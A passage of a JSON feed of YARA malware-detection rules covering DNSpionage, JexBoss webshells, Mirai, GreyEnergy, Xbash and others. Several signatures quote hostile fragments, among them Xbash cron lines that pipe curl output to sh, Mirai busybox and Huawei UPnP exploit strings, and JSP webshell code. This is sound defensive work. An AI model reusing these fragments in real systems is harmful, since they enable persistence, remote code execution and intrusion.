 condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or 2 of them )\n}","date":"2018-11-30 12:35:21","description":"Detects DNSpionage Malware","minimum_yara":"1.7","name":"MAL_DNSPIONAGE_Malware_Nov18_RID3055","reference":"https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targets-middle-east.html","required_modules":[],"rule_hash":"f9d4ad6ed17a2803c455f800d3a3911f","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule WebShell_JexBoss_JSP_1_RID2F20 : DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Detects JexBoss JSPs\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-11-08 11:43:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"equals(\\\"jexboss\\\")\" \n      $x2 = \"%><pre><%if(request.getParameter(\\\"ppp\\\") != null &&\" ascii\n      $s1 = \"<%@ page import=\\\"java.util.*,java.io.*\\\"%><pre><% if (request.getParameter(\\\"\" \n      $s2 = \"!= null && request.getHeader(\\\"user-agent\\\"\" ascii\n      $s3 = \"String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }}%>\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x253c and filesize < 1KB and 1 of ( $x* ) or 2 of them\n}","date":"2018-11-08 11:43:51","description":"Detects JexBoss JSPs","minimum_yara":"1.7","name":"WebShell_JexBoss_JSP_1_RID2F20","reference":"Internal Research","required_modules":[],"rule_hash":"bf0dff0ad831c0fe9000e96d9cd3c4e5","score":75,"tags":["T1100","DEMO","WEBSHELL","FILE"]},{"author":"Florian Roth","content":"rule WebShell_JexBoss_WAR_1_RID2F1D : DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Detects JexBoss versions in WAR form\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-11-08 11:43:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"jbossass\" fullword ascii\n      $ = \"jexws.jsp\" fullword ascii\n      $ = \"jexws.jspPK\" fullword ascii\n      $ = \"jexws1.jsp\" fullword ascii\n      $ = \"jexws1.jspPK\" fullword ascii\n      $ = \"jexws2.jsp\" fullword ascii\n      $ = \"jexws2.jspPK\" fullword ascii\n      $ = \"jexws3.jsp\" fullword ascii\n      $ = \"jexws3.jspPK\" fullword ascii\n      $ = \"jexws4.jsp\" fullword ascii\n      $ = \"jexws4.jspPK\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x4b50 and filesize < 4KB and 1 of them\n}","date":"2018-11-08 11:43:21","description":"Detects JexBoss versions in WAR form","minimum_yara":"1.7","name":"WebShell_JexBoss_WAR_1_RID2F1D","reference":"Internal Research","required_modules":[],"rule_hash":"32621519a4c08d5453423bba3e51ca59","score":75,"tags":["T1100","DEMO","WEBSHELL","FILE"]},{"author":"Florian Roth","content":"rule MAL_BackNet_Nov18_1_RID2D6D : DEMO EXE FILE MAL T1047 {\n   meta:\n      description = \"Detects BackNet samples\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/valsov/BackNet\"\n      date = \"2018-11-02 10:31:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1047\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ProcessedByFody\" fullword ascii\n      $s2 = \"SELECT * FROM AntivirusProduct\" fullword wide\n      $s3 = \"/C netsh wlan show profile\" wide\n      $s4 = \"browsertornado\" fullword wide\n      $s5 = \"Current user is administrator\" fullword wide\n      $s6 = \"/C choice /C Y /N /D Y /T 4 & Del\" wide\n      $s7 = \"ThisIsMyMutex-2JUY34DE8E23D7\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 2 of them\n}","date":"2018-11-02 10:31:21","description":"Detects BackNet samples","minimum_yara":"1.7","name":"MAL_BackNet_Nov18_1_RID2D6D","reference":"https://github.com/valsov/BackNet","required_modules":[],"rule_hash":"2d0c731b8abd59f6d91fa31412ec6ea5","score":75,"tags":["DEMO","EXE","T1047","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_ELF_LNX_Mirai_Oct10_1_RID2F39 : DEMO FILE LINUX MAL {\n   meta:\n      description = \"Detects ELF Mirai variant\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-10-27 11:48:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, LINUX, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \" -r /vi/mips.bushido; \" \n      $x2 = \"/bin/busybox chmod 777 * /tmp/\" fullword ascii\n      $s1 = \"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\" fullword ascii\n      $s2 = \"loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\" fullword ascii\n      $s3 = \"POST /cdn-cgi/\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 200KB and ( ( 1 of ( $x* ) and 1 of ( $s* ) ) or all of ( $x* ) )\n}","date":"2018-10-27 11:48:01","description":"Detects ELF Mirai variant","minimum_yara":"1.7","name":"MAL_ELF_LNX_Mirai_Oct10_1_RID2F39","reference":"Internal Research","required_modules":[],"rule_hash":"9fe2b35f9d6fb9d5dc551cf0fb8b3a67","score":75,"tags":["DEMO","LINUX","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_ELF_LNX_Mirai_Oct10_2_RID2F3A : DEMO FILE LINUX MAL {\n   meta:\n      description = \"Detects ELF malware Mirai related\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-10-27 11:48:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, LINUX, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $c01 = { 50 4F 53 54 20 2F 63 64 6E 2D 63 67 69 2F 00 00\n               20 48 54 54 50 2F 31 2E 31 0D 0A 55 73 65 72 2D\n               41 67 65 6E 74 3A 20 00 0D 0A 48 6F 73 74 3A } \n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 200KB and all of them\n}","date":"2018-10-27 11:48:11","description":"Detects ELF malware Mirai related","minimum_yara":"1.7","name":"MAL_ELF_LNX_Mirai_Oct10_2_RID2F3A","reference":"Internal Research","required_modules":[],"rule_hash":"9756cdae9051814bc60387f787d49b29","score":75,"tags":["DEMO","LINUX","FILE","MAL"]},{"author":"Florian Roth","content":"rule SUSP_Win32dll_String_RID2E60 : DEMO SUSP {\n   meta:\n      description = \"Detects suspicious string in executables\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@Sebdraven/apt-sidewinder-changes-theirs-ttps-to-install-their-backdoor-f92604a2739\"\n      date = \"2018-10-24 11:11:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"win32dll.dll\" fullword ascii\n   condition: \n      filesize < 60KB and all of them\n}","date":"2018-10-24 11:11:51","description":"Detects suspicious string in executables","minimum_yara":"1.7","name":"SUSP_Win32dll_String_RID2E60","reference":"https://medium.com/@Sebdraven/apt-sidewinder-changes-theirs-ttps-to-install-their-backdoor-f92604a2739","required_modules":[],"rule_hash":"6cbeb34cdd69c3482eaf472fa94ec97f","score":60,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule VUL_JQuery_FileUpload_CVE_2018_9206_RID32A2 : DEMO EXPLOIT VULN {\n   meta:\n      description = \"Detects JQuery File Upload vulnerability CVE-2018-9206\"\n      author = \"Florian Roth\"\n      reference = \"https://www.zdnet.com/article/zero-day-in-popular-jquery-plugin-actively-exploited-for-at-least-three-years/\"\n      date = \"2018-10-19 14:13:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXPLOIT, VULN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"error_reporting(E_ALL | E_STRICT);\" fullword ascii\n      $s2 = \"require('UploadHandler.php');\" fullword ascii\n      $s3 = \"$upload_handler = new UploadHandler();\" fullword ascii\n   condition: \n      all of them\n}","date":"2018-10-19 14:13:31","description":"Detects JQuery File Upload vulnerability CVE-2018-9206","minimum_yara":"1.7","name":"VUL_JQuery_FileUpload_CVE_2018_9206_RID32A2","reference":"https://www.zdnet.com/article/zero-day-in-popular-jquery-plugin-actively-exploited-for-at-least-three-years/","required_modules":[],"rule_hash":"28925d8af31a8138b76c7c48e4313ef7","score":75,"tags":["EXPLOIT","DEMO","VULN"]},{"author":"Florian Roth","content":"rule SUSP_Size_of_ASUS_TuningTool_RID3197 : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects an ASUS tuning tool with a suspicious size\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/\"\n      date = \"2018-10-17 13:29:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Release\\\\ASGT.pdb\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and filesize > 70KB and all of them\n}","date":"2018-10-17 13:29:01","description":"Detects an ASUS tuning tool with a suspicious size","minimum_yara":"1.7","name":"SUSP_Size_of_ASUS_TuningTool_RID3197","reference":"https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/","required_modules":[],"rule_hash":"877ecec366fd74453e4622c84b1137f2","score":60,"tags":["SUSP","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_GreyEnergy_Malware_Oct18_1_RID31FC : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects samples from Grey Energy report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/\"\n      date = \"2018-10-17 13:45:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%SystemRoot%\\\\System32\\\\thinmon.dll\" fullword ascii\n      $s2 = \"'Cannot delete list entry (fatal error)!9The module %s cannot be executed on this system (0x%.4x).%Enumerate all sessions on TSE\" wide\n      $s8 = \"cbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbe\" ascii\n      $s14 = \"configure the service\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and pe.imphash ( ) == \"98d1ad672d0db4b4abdcda73cc9835cb\" and all of them\n}","date":"2018-10-17 13:45:51","description":"Detects samples from Grey Energy report","minimum_yara":"1.7","name":"APT_GreyEnergy_Malware_Oct18_1_RID31FC","reference":"https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/","required_modules":["pe"],"rule_hash":"417bb04c18efa14ede7f2187a5e81ab1","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT_GreyEnergy_Malware_Oct18_2_RID31FD : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects samples from Grey Energy report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/\"\n      date = \"2018-10-17 13:46:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"WioGLtonuaptWmrnttfepgetneemVsnygnV\" fullword ascii\n      $s2 = \"PnSenariopoeKerGEtxrcy\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 2 of them\n}","date":"2018-10-17 13:46:01","description":"Detects samples from Grey Energy report","minimum_yara":"1.7","name":"APT_GreyEnergy_Malware_Oct18_2_RID31FD","reference":"https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/","required_modules":[],"rule_hash":"25494921f5c155770a1ed4d19850e2d4","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT_GreyEnergy_Malware_Oct18_3_RID31FE : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects samples from Grey Energy report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/\"\n      date = \"2018-10-17 13:46:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"USQTUNPPQONOPOQUMSNUTRMRRLVPUOPMROPMPMQTPNPONVUOUQOMMNNSRSRQQVTPPRSSNVSTURTMMOPTONSQTOMONQVMQNUSONTQTUTSRRPVTONUQNORQMRRNRUSPS\" fullword ascii\n      $x2 = \"tEMPiuP\" fullword ascii\n      $x3 = \"sryCEMieye\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them\n}","date":"2018-10-17 13:46:11","description":"Detects samples from Grey Energy report","minimum_yara":"1.7","name":"APT_GreyEnergy_Malware_Oct18_3_RID31FE","reference":"https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/","required_modules":[],"rule_hash":"a2fb0917d72762344f9526d6e7c27417","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT_GreyEnergy_Malware_Oct18_4_RID31FF : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects samples from Grey Energy report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/\"\n      date = \"2018-10-17 13:46:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"iiodttd.eWt\" fullword ascii\n      $x2 = \"irnnaar-ite-ornaa-naa-asoeienaeaanlagoeas:acnuihaaa\" fullword ascii\n      $x3 = \"NURVNTURVORSMSPPRTQMPTTQOQRP\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"279adfbd42308a07b3131ee57d067b3e\" or 1 of them )\n}","date":"2018-10-17 13:46:21","description":"Detects samples from Grey Energy report","minimum_yara":"1.7","name":"APT_GreyEnergy_Malware_Oct18_4_RID31FF","reference":"https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/","required_modules":["pe"],"rule_hash":"713a4f65c36c19c4ebe7d523fe29f5ac","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT_GreyEnergy_Malware_Oct18_5_RID3200 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects samples from Grey Energy report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/\"\n      date = \"2018-10-17 13:46:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s12 = \"WespySSld.eQ\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them\n}","date":"2018-10-17 13:46:31","description":"Detects samples from Grey Energy report","minimum_yara":"1.7","name":"APT_GreyEnergy_Malware_Oct18_5_RID3200","reference":"https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/","required_modules":[],"rule_hash":"b7e2162f7eb8bd8aba59a91e2ac7fb43","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_JRAT_Oct18_1_RID2BF9 : DEMO FILE MAL {\n   meta:\n      description = \"Detects JRAT malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-10-11 09:29:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"/JRat.class\" ascii\n   condition: \n      uint16 ( 0 ) == 0x4b50 and filesize < 700KB and 1 of them\n}","date":"2018-10-11 09:29:21","description":"Detects JRAT malware","minimum_yara":"1.7","name":"MAL_JRAT_Oct18_1_RID2BF9","reference":"Internal Research","required_modules":[],"rule_hash":"75f6c0c536703a47f30a2bc9445afa45","score":75,"tags":["DEMO","FILE","MAL"]},{"author":"Florian Roth","content":"rule HKTL_SqlMap_backdoor_RID2E95 : DEMO FILE HKTL MAL SUSP {\n   meta:\n      description = \"Detects SqlMap backdoors\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/sqlmapproject/sqlmap\"\n      date = \"2018-10-09 11:20:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL, MAL, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      ( uint32 ( 0 ) == 0x8e859c07 or uint32 ( 0 ) == 0x2d859c07 or uint32 ( 0 ) == 0x92959c07 or uint32 ( 0 ) == 0x929d9c07 or uint32 ( 0 ) == 0x29959c07 or uint32 ( 0 ) == 0x2b8d9c07 or uint32 ( 0 ) == 0x2b859c07 or uint32 ( 0 ) == 0x28b59c07 ) and filesize < 2KB\n}","date":"2018-10-09 11:20:41","description":"Detects SqlMap backdoors","minimum_yara":"1.7","name":"HKTL_SqlMap_backdoor_RID2E95","reference":"https://github.com/sqlmapproject/sqlmap","required_modules":[],"rule_hash":"fd9f97c93c7703763be08d02ac9126fc","score":75,"tags":["SUSP","DEMO","HKTL","FILE","MAL"]},{"author":"Florian Roth","content":"rule HKTL_SqlMap_RID2AF1 : DEMO HKTL {\n   meta:\n      description = \"Detects sqlmap hacktool\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/sqlmapproject/sqlmap\"\n      date = \"2018-10-09 09:33:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"if cmdLineOptions.get(\\\"sqlmapShell\\\"):\" fullword ascii\n      $x2 = \"if conf.get(\\\"dumper\\\"):\" fullword ascii\n   condition: \n      filesize < 50KB and 1 of them\n}","date":"2018-10-09 09:33:21","description":"Detects sqlmap hacktool","minimum_yara":"1.7","name":"HKTL_SqlMap_RID2AF1","reference":"https://github.com/sqlmapproject/sqlmap","required_modules":[],"rule_hash":"0f6a00eefaa6b2703b4a41155b28bcd3","score":75,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule SUSP_Script_Obfuscation_Char_Concat_RID34A0 : DEMO OBFUS SUSP T1027 {\n   meta:\n      description = \"Detects strings found in sample from CN group repo leak in October 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/JaromirHorejsi/status/1047084277920411648\"\n      date = \"2018-10-04 15:38:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, OBFUS, SUSP, T1027\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\"c\\\" & \\\"r\\\" & \\\"i\\\" & \\\"p\\\" & \\\"t\\\"\" ascii\n   condition: \n      1 of them\n}","date":"2018-10-04 15:38:31","description":"Detects strings found in sample from CN group repo leak in October 2018","minimum_yara":"1.7","name":"SUSP_Script_Obfuscation_Char_Concat_RID34A0","reference":"https://twitter.com/JaromirHorejsi/status/1047084277920411648","required_modules":[],"rule_hash":"dcc29ae427be97b48072b002c9a3197d","score":75,"tags":["SUSP","DEMO","T1027","OBFUS"]},{"author":"Florian Roth","content":"rule SUSP_SFX_cmd_RID2B3F : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects suspicious SFX as used by Gamaredon group\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-09-27 08:58:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = /RunProgram=\\\"hidcon:[a-zA-Z0-9]{1,16}.cmd/ fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them\n}","date":"2018-09-27 08:58:21","description":"Detects suspicious SFX as used by Gamaredon group","minimum_yara":"1.7","name":"SUSP_SFX_cmd_RID2B3F","reference":"Internal Research","required_modules":[],"rule_hash":"081b64633da5138ebfafd86c13629018","score":75,"tags":["SUSP","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule SUSP_SFX_RunProgram_WScript_RID3143 : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects suspicious SFX as used by Gamaredon group\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-09-27 13:15:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"RunProgram=\\\"wscript.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and 1 of them\n}","date":"2018-09-27 13:15:01","description":"Detects suspicious SFX as used by Gamaredon group","minimum_yara":"1.7","name":"SUSP_SFX_RunProgram_WScript_RID3143","reference":"Internal Research","required_modules":[],"rule_hash":"7406550f49d81846af5b6eeba58ffa45","score":60,"tags":["SUSP","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule SUSP_CMD_Var_Expansion_RID2F2B : DEMO FILE OFFICE SUSP T1193 T1203 {\n   meta:\n      description = \"Detects Office droppers that include a variable expansion string\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/asfakian/status/1044859525675843585\"\n      date = \"2018-09-26 11:45:41\"\n      score = 45\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, OFFICE, SUSP, T1193, T1203\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \" /V:ON\" ascii wide fullword\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 500KB and $a1\n}","date":"2018-09-26 11:45:41","description":"Detects Office droppers that include a variable expansion string","minimum_yara":"1.7","name":"SUSP_CMD_Var_Expansion_RID2F2B","reference":"https://twitter.com/asfakian/status/1044859525675843585","required_modules":[],"rule_hash":"7c1163971a89e1921c1a486baaa5072a","score":45,"tags":["OFFICE","T1203","T1193","SUSP","DEMO","FILE"]},{"author":"Florian Roth","content":"rule MAL_Xbash_PY_Sep18_RID2D38 : DEMO FILE MAL {\n   meta:\n      description = \"Detects Xbash malware\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/09/unit42-xbash-combines-botnet-ransomware-coinmining-worm-targets-linux-windows/\"\n      date = \"2018-09-18 10:22:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = { 73 58 62 61 73 68 00 00 00 00 00 00 00 00 } \n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 10000KB and 1 of them\n}","date":"2018-09-18 10:22:31","description":"Detects Xbash malware","minimum_yara":"1.7","name":"MAL_Xbash_PY_Sep18_RID2D38","reference":"https://researchcenter.paloaltonetworks.com/2018/09/unit42-xbash-combines-botnet-ransomware-coinmining-worm-targets-linux-windows/","required_modules":[],"rule_hash":"cdc1944ecbd9d229ffb66027e029f9b5","score":75,"tags":["DEMO","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_Xbash_SH_Sep18_RID2D2A : DEMO FILE MAL {\n   meta:\n      description = \"Detects Xbash malware\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/09/unit42-xbash-combines-botnet-ransomware-coinmining-worm-targets-linux-windows/\"\n      date = \"2018-09-18 10:20:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"echo \\\"*/5 * * * * curl -fsSL\" fullword ascii\n      $s2 = \".sh|sh\\\" > /var/spool/cron/root\" fullword ascii\n      $s3 = \"#chmod +x /tmp/hawk\" fullword ascii\n      $s4 = \"if [ ! -f \\\"/tmp/root.sh\\\" ]\" fullword ascii\n      $s5 = \".sh > /tmp/lower.sh\" fullword ascii\n      $s6 = \"chmod 777 /tmp/root.sh\" fullword ascii\n      $s7 = \"-P /tmp && chmod +x /tmp/pools.txt\" fullword ascii\n      $s8 = \"-C /tmp/pools.txt>/dev/null 2>&1\" ascii\n   condition: \n      uint16 ( 0 ) == 0x2123 and filesize < 3KB and 1 of them\n}","date":"2018-09-18 10:20:11","description":"Detects Xbash malware","minimum_yara":"1.7","name":"MAL_Xbash_SH_Sep18_RID2D2A","reference":"https://researchcenter.paloaltonetworks.com/2018/09/unit42-xbash-combines-botnet-ransomware-coinmining-worm-targets-linux-windows/","required_modules":[],"rule_hash":"a1d2fa5cf9289ef93a69c9f7a1ed4198","score":75,"tags":["DEMO","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_Xbash_JS_Sep18_RID2D2C : DEMO FILE MAL {\n   meta:\n      description = \"Detects XBash malware\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/09/unit42-xbash-combines-botnet-ransomware-coinmining-worm-targets-linux-windows/\"\n      date = \"2018-09-18 10:20:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"var path=WSHShell\" fullword ascii\n      $s2 = \"var myObject= new ActiveXObject(\" fullword ascii\n      $s3 = \"window.resizeTo(0,0)\" fullword ascii\n      $s4 = \"<script language=\\\"JScript\\\">\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x483c and filesize < 5KB and 8 of them\n}","date":"2018-09-18 10:20:31","description":"Detects XBash malware","minimum_yara":"1.7","name":"MAL_Xbash_JS_Sep18_RID2D2C","reference":"https://researchcenter.paloaltonetworks.com/2018/09/unit42-xbash-combines-botnet-ransomware-coinmining-worm-targets-linux-windows/","required_modules":[],"rule_hash":"fadb40b08eb743e0f151e99bc5b5045b","score":75,"tags":["DEMO","FILE","MAL"]},{"author":"Florian Roth","content":"rule SUSP_Microsoft_7z_SFX_Combo_RID3120 : ANOMALY DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects a suspicious file that has a Microsoft copyright and is a 7z SFX\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-09-16 13:09:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"ANOMALY, DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"7ZSfx%03x.cmd\" fullword wide\n      $s2 = \"7z SFX: error\" fullword ascii\n      $c1 = { 00 4C 00 65 00 67 00 61 00 6C 00 43 00 6F 00 70\n              00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 A9\n              00 20 00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F\n              00 66 00 74 00 20 00 43 00 6F 00 72 00 70 00 6F\n              00 72 00 61 00 74 00 69 00 6F 00 6E 00 2E 00 20\n              00 41 00 6C 00 6C 00 20 00 72 00 69 00 67 00 68\n              00 74 00 73 00 20 00 72 00 65 